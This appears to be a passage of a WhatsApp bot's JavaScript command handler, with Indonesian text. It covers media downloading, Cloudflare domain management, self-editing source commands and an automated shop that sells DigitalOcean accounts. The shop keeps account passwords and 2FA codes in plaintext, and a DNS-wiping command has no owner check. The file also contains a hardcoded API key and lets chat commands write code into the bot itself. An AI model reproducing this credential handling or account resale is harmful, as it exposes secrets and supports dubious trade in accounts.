    body: bodyForm,
  });
  let data = await res.text();
  return data;
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await dt(aa)
const resnya = await fetchJson(`https://restapi.simplebot.my.id/imagecreator/removebg?apikey=${global.apipayment}&url=${dd}`)
await TamaMods.sendMessage(m.chat, {image: await getBuffer(resnya.result), caption: "Remove Background Done ✅"}, {quoted: pantek})
}
break



//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "buydo": case "buydigitalocean": {
if (stokdo.length < 1) return Reply("Maaf stok do sedang tidak tersedia")
if (m.isGroup) return Reply("Pembelian digitalocean hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) {
let butnya = []
let urutt = 0
for (let gg of stokdo) {
butnya.push({
title: `${gg.droplet} Droplet`, 
description: `Rp${await toIDR(gg.harga)}`, 
id: `.buydo ${urutt += 1}`
})
}
return TamaMods.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Droplet',
          sections: [
            {
              title: 'List Stok Digitalocean',
              highlight_label: 'Recommended',
              rows: butnya
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}\nAuto Order Akun Do`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Stock Digitalocean\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: pantek})
}

const donya = stokdo[Number(text) - 1]
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = donya.harga
Obj.akun = donya
const UrlQr = global.QrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.qrisOrderKuota}`);
const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* Digitalocean ${donya.droplet} Drop
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Digitalocean ${Obj.akun.droplet} Droplet
`}, {quoted: db.users[m.sender].saweria.msg})
var teks = `*Data Akun Digitalocean 📦*

*💌 Email :* ${Obj.akun.email}
*🔐 Password :* ${Obj.akun.password}
*Kode 2FA :* ${Obj.akun.kode2fa}
*Droplet :* ${Obj.akun.droplet}

*Syarat & Ketentuan :*
* Simpan data ini sebaik mungkin
* Seller hanya mengirim 1 kali!
* Garansi akun aktif 30 day
`
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: pantek})
const position = stokdo.indexOf(Obj.akun)
stokdo.splice(position, 1)
await fs.writeFileSync("./Access/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break
//------(Batas Case)------//
case "adddomaincf": case "adddomcf": {
if (!isOwner) return Reply(mess.owner)
if (!text || !text.includes(".")) return example("domainmu.com")
const CLOUDFLARE_TOKEN = global.apitoken_cloudflare
const CLOUDFLARE_EMAIL = global.email_cloudflare
const cloudflare = axios.create({
    baseURL: 'https://api.cloudflare.com/client/v4',
    headers: {
        'Authorization': `Bearer ${CLOUDFLARE_TOKEN}`,
        'Content-Type': 'application/json'
    }
});
async function addNewDomainToCloudflare(domainName) {
    try {
        const response = await cloudflare.post('/zones', {
            name: domainName,
            account: {
                id: global.accountid_cloudflare
            },
            plan: {
                id: 'free'
            },
            type: 'full',
            jump_start: true
        });
        return response.data
    } catch (error) {
        return 'Gagal menambahkan domain:' + JSON.stringify(error.response ? error.response.data : error.message, null, 2)
    }
}
let res = await addNewDomainToCloudflare(text.toLowerCase())
if (res?.result?.name_servers) {
let respon = `
Domain ${text.toLowerCase()} Berhasil Ditambahkan Kedalam Cloudflare ✅

*Name Server :*
* ns1 ${res.result.name_servers[0]}
* ns2 ${res.result.name_servers[1]}
`
return Reply(respon)
} else {
return Reply(JSON.stringify(res, null, 2))
}
}
break
//------(Batas Case)------//
case "clearsubdo": case "clearallsubdo": case "clsubdo": case "clearsubdomain": {
if (!text || !text.includes("|")) return example('zoneid|apikey')
let [apizone, apitoken] = text.split("|")
const CLOUDFLARE_API_KEY = apitoken;  // Ganti dengan API key
const CLOUDFLARE_ZONE_ID = apizone;  // Ganti dengan Zone ID

async function getAllDNSRecords() {
    let allRecords = [];
    let page = 1;
    let totalPages = 1;

    try {
        while (page <= totalPages) {
            const response = await axios.get(`https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/dns_records`, {
                params: { page, per_page: 100 },
                headers: {
                    'Authorization': `Bearer ${CLOUDFLARE_API_KEY}`,
                    'Content-Type': 'application/json'
                }
            });

            if (!response.data.success) {
                console.error("Gagal mengambil DNS records:", response.data.errors);
                return [];
            }

            allRecords.push(...response.data.result);
            totalPages = response.data.result_info.total_pages;
            page++;
        }
    } catch (error) {
        console.error("Terjadi kesalahan saat mengambil DNS records:", error.message);
    }
    return allRecords;
}

// Fungsi untuk menghapus semua DNS record
async function deleteAllDNSRecords() {
    try {
        const records = await getAllDNSRecords();
        const totalDns = records.length

        if (records.length === 0) {
            await Reply("Tidak ada Subdomain yang ditemukan.");
            return;
        }

        Reply(`${totalDns} Subdomain ditemukan. Memproses penghapusan...`);

        for (const record of records) {
            try {
                const deleteResponse = await axios.delete(`https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/dns_records/${record.id}`, {
                    headers: {
                        'Authorization': `Bearer ${CLOUDFLARE_API_KEY}`,
                        'Content-Type': 'application/json'
                    }
                });

                if (deleteResponse.data.success) {
                    console.log(`✅ Berhasil menghapus record: ${record.name} (ID: ${record.id})`);
                } else {
                    console.error(`❌ Gagal menghapus record ${record.name}:`, deleteResponse.data.errors);
                }
            } catch (error) {
                console.error(`❌ Terjadi kesalahan saat menghapus record ${record.name}:`, error.message);
            }
        }

        await Reply(`Berhasil menghapus ${totalDns} Subdomain ✅`);
    } catch (error) {
        console.error("Terjadi kesalahan:", error.message);
    }
}

// Jalankan fungsi
return deleteAllDNSRecords();
}
break
//------(Batas Case)------//
case "listdomaincf": case "listdomcf": {
if (!isOwner) return Reply(mess.owner)
const CLOUDFLARE_API_KEY = global.apitoken_cloudflare // Ganti dengan API Key atau API Token
const CLOUDFLARE_EMAIL = global.email_cloudflare // Email akun Cloudflare (jika pakai API Key)

async function getAllDomains() {
    let page = 1;
    let domains = [];
    let hasMore = true;

    while (hasMore) {
        const url = `https://api.cloudflare.com/client/v4/zones?page=${page}&per_page=50`; // Maksimal 50 per halaman

        const response = await fetch(url, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${CLOUDFLARE_API_KEY}`, // Jika pakai API Token
                // 'X-Auth-Email': CLOUDFLARE_EMAIL, // Jika pakai API Key
                // 'X-Auth-Key': CLOUDFLARE_API_KEY  // Jika pakai API Key
            }
        });

        const data = await response.json();
        
        if (data.success) {
            domains = domains.concat(data.result.map(zone => ({
                id: zone.id,
                name: zone.name,
                status: zone.status
            })));

            // Cek apakah masih ada halaman berikutnya
            hasMore = data.result_info.page < data.result_info.total_pages;
            page++;
        } else {
            console.error('Gagal mengambil daftar domain:', data.errors);
            return [];
        }
    }

    console.log('Total Domain:', domains.length);
    console.log('Daftar Domain:', domains);
    return domains;
}


// Jalankan function
let res = await getAllDomains();
if (res.length < 1) return Reply("Tidak ada domain di cloudflare")
let teks = `\n*Total Domain Cloudflare :* ${res.length}\n`
for (let i of res) {
teks += `
* ${i.name}
* *Status :* ${i.status == "active" ? i.status + " ✅" : i.status == "pending" ? i.status + " 🕞" : i.status + " ❌"}
`
}
return Reply(teks)
}
break
//------(Batas Case)------//
case "adddomain": case "adddom": {
if (!isOwner) return Reply(mess.owner)
let [dom, zone, api] = text.split("|")
if (!dom || !zone || !api) return example("domain|zoneid|apitoken")
dom = dom.toLowerCase()
if (domains[dom]) return Reply(`Domain ${dom} sudah terdaftar di dalam database subdomain`)
domains[dom] = {
zone: zone, 
apitoken: api
}
await fs.writeFileSync("./System/data/domain.json", JSON.stringify(domains, null, 2))
Reply(`Berhasil menambahkan domain ${dom} ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deldomain": case "deldom": {
if (!isOwner) return Reply(mess.owner)
if (Object.keys(domains).length < 1) return Reply("Tidak ada domain di dalam database subdomain")
let dom = text.toLowerCase()
if (dom == "all") {
domains = {}
await fs.writeFileSync("./System/data/domain.json", JSON.stringify(domains, null, 2))
return Reply(`Berhasil menghapus semua domain ✅`)
}
if (!domains[dom]) return Reply(`Domain ${dom} tidak terdaftar di dalam database subdomain`)
delete domains[dom]
await fs.writeFileSync("./System/data/domain.json", JSON.stringify(domains, null, 2))
Reply(`Berhasil menghapus domain ${dom} ✅`)
}
break
//------(Batas Case)------//
case "listdomain": case "listdom": {
if (!isOwner) return Reply(mess.owner)
if (Object.keys(domains).length < 1) return Reply("Tidak ada domain di database subdomain")
let teks = "\n"
for (let i of Object.keys(domains)) {
teks += `* ${i}\n`
}
teks += `\n Contoh Penggunaan :\n *.domain* 2 host|ipvps\n`
return Reply(teks)
}
break
//------(Batas Case)------//
case "addstok": case "adddo": case "addstokdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("tama@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
if (!text.split("|")) return Reply(example("tama@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
const cek = text.split("|")
if (cek.length < 5) return Reply(example("tama@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
let [email, pw, kode2fa, reff, droplet, harga] = text.split("|")
stokdo.push({
email: email, 
password: pw, 
kode2fa: kode2fa, 
referall: reff, 
droplet: droplet, 
harga: Number(harga)
})
await fs.writeFileSync("./Access/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await Reply("Berhasil menambah data stok digitalocean ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delstok": case "delstokdo": case "deldo": {
if (!isCreator) return Reply(mess.owner)
if (stokdo.length < 1) return Reply("Tidak ada stok")
if (text == "all") {
await stokdo.splice(0, stokdo.length)
await fs.writeFileSync("./Access/database/stokdo.json", JSON.stringify(stokdo, null, 2))
return Reply(`Berhasil menghapus semua stok data akun digitalocean ✅`)
}
if (!text || isNaN(text)) return Reply(example("idnya\n\nKetik *.liststok* untuk lihat id"))
if (Number(text) > stokdo.length) return Reply("Id stok tidak ditemukan")
let inx = Number(text) - 1
stokdo.splice(inx, 1)
await fs.writeFileSync("./Access/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await Reply("Berhasil menghapus data stok digitalocean ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "liststok": case "liststokdo": case "listdo": {
if (!isCreator) return Reply(mess.owner)
if (stokdo.length < 1) return Reply("Tidak ada stok")
//if (m.isGroup) return Reply(mess.private)
let messageText = "\n *── List stok akun digital ocean*\n"
let count = 0
for (let res of stokdo) {
messageText += `\n*ID Stok :* ${count += 1}
*Email :* ${res.email}
*Password :* ${res.password}
*Kode 2FA :* ${res.kode2fa}
*Referall :* ${res.referall}
*Harga :* Rp${await toIDR(res.harga.toString())}
*Droplet :* ${res.droplet}\n`
}
return Reply(messageText)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upswtag": {
if (!isOwner) return Reply(mess.owner)
if (!text) return Reply(example("text & bisa dengan kirim foto"))
if (/image/.test(mime)) global.imgsw = qmsg
const meta = await TamaMods.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textupsw = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.create-storywa ${i}|${meta[i].subject}`, 
description: `${meta[i].participants.length} Member`
})
}
return TamaMods.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Tag Grub\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: pantek}) 
}
break
//------(Batas Case)------//
case "ip": case "getip": {
if (!isOwner) return Reply(mess.owner)
let t = await fetchJson('https://api64.ipify.org?format=json')
Reply(`ip Panel : ${t.ip}`)
}
break
//------(Batas Case)------//
case "play": {
if (!text) return example("somebody pleasure")
Reply(mess.wait)
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]
var anu = await ytmp3(res.url)
if (anu.audio) {
let urlMp3 = anu.audio
TamaMods.sendMessage(m.chat, { react: { text: `〽️`, key: m.key }})
await TamaMods.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: pantek})
} else {
return Reply("Error! Result Not Found")
}
}
break
//------(Batas Case)------//
case "addprem": case "addpremium": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return Reply('*Contoh Penggunaan : .addprem 628xx*')
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return Reply(`Nomor ${input2} sudah menjadi premium!`)
premium.push(input)
await fs.writeFileSync("./Access/database/premium.json", JSON.stringify(premium, null, 2))
Reply(`The Number ${input2} Has Been Premium!`)
}
break
//------(Batas Case)------//
case "listprem": case "listpremium": {
if (premium.length < 1) return Reply("Tidak ada user reseller")
let teks = `\n *[ ! ] List All User Premium*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
TamaMods.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: pantek})
}
break
//------(Batas Case)------//
case "delpremium": case "delprem": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return Reply('*Example : .delprem 628xx*')
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return Reply(`Tidak bisa menghapus premium owner!`)
if (!premium.includes(input)) return Reply(`Nomor ${input2} bukan user premium!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./Access/database/premium.json", JSON.stringify(premium, null, 2))
Reply(`The Number ${input2} Has Been Removed From Premium!`)
}
break
//------(Batas Case)------//
case 'addcase': {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(`Contoh: ${prefix+command} case nya`);
const namaFile = path.join(__dirname, '../Console/ZephCase.js');
const caseBaru = `${text}\n\n`;
const tambahCase = (data, caseBaru) => {
const posisiDefault = data.lastIndexOf("default:");
if (posisiDefault !== -1) {
const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Tidak dapat menemukan case default di dalam file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return Reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
}
const result = tambahCase(data, caseBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('Terjadi kesalahan saat menulis file:', err);
return Reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
} else {
console.log('Sukses menambahkan case baru:');
console.log(caseBaru);
return Reply('Sukses menambahkan case!');
}});
} else {
console.error(result.message);
return Reply(result.message);
}});
}
break
//------(Batas Case)------//
case 'delcase': {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(`Contoh: ${prefix+command} nama case`);
const fs = require('fs').promises;
async function dellCase(filePath, caseNameToRemove) {
try {
let data = await fs.readFile(filePath, 'utf8');
const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
const modifiedData = data.replace(regex, '');
if (data === modifiedData) {
Reply('Case tidak ditemukan atau sudah dihapus.');
return;
}
await fs.writeFile(filePath, modifiedData, 'utf8');
Reply('Sukses menghapus case!');
} catch (err) {
Reply(`Terjadi kesalahan: ${err.message}`);
}}
dellCase('./Console/ZephCase.js', q);
break;
}

case 'editcase':
    if (!q) return Reply('Mana case yang ingin diedit? Format: .editcase case \'namafitur\':\n\n<kode baru>');
    if (!isCreator) return Reply(mess.owner)

    const caseNameRegex = /case\s+'([^']+)':/; 
    const match = q.match(caseNameRegex);

    if (!match) {
        return Reply('Format tidak benar. Contoh: .editcase case \'namafitur\':\n\n<kode baru>');
    }
    const caseName = match[1]; 
    const newCode = q.replace(caseNameRegex, '').trim(); 
    const filenyabang = path.join(__dirname, './Console/ZephCase.js');
    try {
        let data = fs.readFileSync(filenyabang, 'utf8');
        const caseRegex = new RegExp(`case\\s+'${caseName}'\\s*:\\s*`, 'g');
        const startIndex = data.search(caseRegex);
        if (startIndex !== -1) {
            let endIndex = -1;
            const breakPattern = /break\s*;/g;
            breakPattern.lastIndex = startIndex;
            const breakMatch = breakPattern.exec(data);
            if (breakMatch) {
                endIndex = breakMatch.index + breakMatch[0].length;
            }
            const nextCasePattern = /case\s+'/g;
            nextCasePattern.lastIndex = startIndex + 1;
            const nextCaseMatch = nextCasePattern.exec(data);

            if (nextCaseMatch && (endIndex === -1 || nextCaseMatch.index < endIndex)) {
                endIndex = nextCaseMatch.index;
            }
            if (endIndex !== -1) {
                const updatedCode = `case '${caseName}':\n${newCode}\n`;
                data = data.slice(0, startIndex) + updatedCode + data.slice(endIndex);
                fs.writeFileSync(filenyabang, data, 'utf8');
                Reply(`Succesfully update case ${q}!`);
            } else {
                Reply('Maaf, tidak ditemukan akhir yang jelas untuk case tersebut.');
            }
        } else {
            Reply('Sorry, case nya gada di file data1.js');
        }
    } catch (err) {
        console.error(err);
        Reply('Eror, silahkan cek console untuk lihat apa yang eror');
    }
    break;

case 'renamecase':
    if (!q) return Reply('Format tidak valid. Contoh: renamecase menu|menu2');
    if (!isCreator) return Reply(mess.owner)
    const [oldCaseName, newCaseName] = q.split('|').map(name => name.trim());
    if (!oldCaseName || !newCaseName) {
        return Reply('Format tidak valid. Contoh: renamecase Old|New');
    }
    const rinembos = path.join(__dirname, '../Console/ZephCase.js');
    try {
        let data = fs.readFileSync(rinembos, 'utf8');
        const caseRegex = new RegExp(`case\\s+'${oldCaseName}'\\s*:\\s*`, 'g');
        const startIndex = data.search(caseRegex);

        if (startIndex === -1) {
            return Reply(`Case '${oldCaseName}' tidak ditemukan.`);
        }
        const nextCasePattern = /case\s+'/g;
        nextCasePattern.lastIndex = startIndex + 1;
        const nextCaseMatch = nextCasePattern.exec(data);
        const updatedData = data.replace(caseRegex, `case '${newCaseName}':`);
        fs.writeFileSync(rinembos, updatedData, 'utf8');
        Reply(`Case '${oldCaseName}' sukses menjadi '${newCaseName}'!`);
    } catch (err) {
        console.error(err);
        Reply('Terjadi kesalahan saat membaca atau menulis file.');
    }
    break;
    
    

case 'info-cuaca':{
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply ('What location?')
let wdata = await axios.get(
`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
);
let textw = ""
textw += `*🗺️Weather of  ${text}*\n\n`
textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
textw += `*Description:-* ${wdata.data.weather[0].description}\n`
textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
textw += `*Country:-* ${wdata.data.sys.country}\n`

  TamaMods.sendMessage(
m.chat, {
text: textw,
}, {
quoted: pantek,
}
   )
   }
   break
//------(Batas Case)------//
case 'listcase': {
if (!isCreator) return Reply(mess.owner)
let { listCase } = require('../Access/listcase.js')
Reply(listCase())
}
break
//------(Batas Case)------//
case 'addfunc':
case 'addfunction': {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(`Contoh: ${prefix+command} function barunya`);
const namaFile = path.join(__dirname, './Console/ZephCase.js');
const functionBaru = `${text}\n\n`;
const tambahFunction = (data, functionBaru) => {
const posisiButtonUrl = data.indexOf("function buttonurl");
if (posisiButtonUrl !== -1) {
const kodeBaruLengkap = data.slice(0, posisiButtonUrl) + functionBaru + data.slice(posisiButtonUrl);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Tidak dapat menemukan function buttonurl di dalam file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return Reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
}
const result = tambahFunction(data, functionBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('Terjadi kesalahan saat menulis file:', err);
return Reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
} else {
console.log('Sukses menambahkan function baru:');
console.log(functionBaru);
return Reply('Sukses menambahkan function!');
}});
} else {
console.error(result.message);
return Reply(result.message);
}});
}
break;

case 'delfunc':
case 'delfunction': {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(`Contoh: ${prefix+command} functionName`);
const isValidFunctionName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const deleteFunction = (functionName) => {
if (!isValidFunctionName(functionName)) return Reply(`Nama fungsi tidak valid: ${functionName}`);
try {
const fileContent = fs.readFileSync("./Console/ZephCase.js", "utf8");
const functionRegex = new RegExp(`function\\s+${functionName}\\s*\\([^)]*\\)\\s*{`, "g");
const match = functionRegex.exec(fileContent);
if (!match) return Reply(`Fungsi ${functionName} tidak ditemukan`);
const functionStart = match.index;
let braceCount = 0;
let inString = false;
let inComment = false;
let currentChar, prevChar;
let functionEnd;

for (let i = functionStart; i < fileContent.length; i++) {
currentChar = fileContent[i];
if (prevChar === '/' && currentChar === '*') inComment = true;
if (prevChar === '*' && currentChar === '/') inComment = false;
if (!inComment) {
if (currentChar === '"' || currentChar === "'" || currentChar === '`') inString = !inString;
if (!inString) {
if (currentChar === '{') braceCount++;
if (currentChar === '}') braceCount--;
}}
if (braceCount === 0 && currentChar === '}') {
functionEnd = i + 1;
break;
}
prevChar = currentChar;
}
if (functionEnd === undefined) return Reply(`Fungsi ${functionName} tidak lengkap atau kurung kurawal tidak seimbang`);
const updatedContent = fileContent.slice(0, functionStart) + fileContent.slice(functionEnd);
fs.writeFileSync("./Console/ZephCase.js", updatedContent, "utf8");
return Reply(`Fungsi ${functionName} telah dihapus`);
} catch (err) {
return Reply(`Terjadi kesalahan: ${err.message}`);
}};
Reply(deleteFunction(q));
}
break


//================================================================================

case "playvid": {
if (!text) return Reply(example("dj tiktok"))
await TamaMods.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp4(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await TamaMods.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: pantek})
} else {
return Reply("Error! Result Not Found")
}
await TamaMods.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

case "yts": {
if (!text) return Reply(example('we dont talk'))
await TamaMods.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await Reply(teks)
await TamaMods.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

case 'ytmp3': {
 if (!text) return Reply(`Silakan masukkan link youtube nya, Contoh : ${prefix + command} https://youtube.com/watch?v=Xs0Lxif1u9E`);
 const url = text.trim();
 const format = 'mp3';
 const regex = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.?be)\/.+$/;
 if (!regex.test(url)) {
 return Reply('link yang anda berikan tidak valid, silahkan masuk kan link yang benar.');
 }
 Reply(mess.wait);
 try {
 const headers = {
    "accept": "*/*",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "Referer": "https://id.ytmp3.mobi/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  }
const initial = await fetch(`https://d.ymcdn.org/api/v1/init?p=y&23=1llum1n471&_=${Math.random()}`, {headers});
let format = 'mp4';
const init = await initial.json();
const id = url.match(/(?:youtu\.be\/|youtube\.com\/(?:.*v=|.*\/|.*embed\/))([^&?/]+)/)?.[1];
let convertURL = init.convertURL + `&v=${id}&f=${format}&_=${Math.random()}`;
const converts = await fetch(convertURL, {headers});
const convert = await converts.json();
let info = {};
for (let i = 0; i < 3; i++ ){
    let j = await fetch(convert.progressURL, {headers});
    info = await j.json();
    console.log(info);
    if (info.progress == 3) break;
}
const result = {
    url: convert.downloadURL,
    title: info.title
}
await TamaMods.sendMessage(m.chat, {
            audio: { url: result.url },
            mimetype: 'audio/mp4'
        }, { quoted: pantek });
} catch {
  Reply('aduh kak error nieh..')
}
}
break

//================================================================================

case 'ytmp4': {
 if (!text) return Reply(`Silakan masukkan link youtube nya, Contoh:  ${prefix + command} https://youtube.com/watch?v=Xs0Lxif1u9E`);
 Reply(mess.wait);
try {
 const url = text.trim();
const headers = {
    "accept": "*/*",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "Referer": "https://id.ytmp3.mobi/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  }
const initial = await fetch(`https://d.ymcdn.org/api/v1/init?p=y&23=1llum1n471&_=${Math.random()}`, {headers});
let format = 'mp4';
const init = await initial.json();
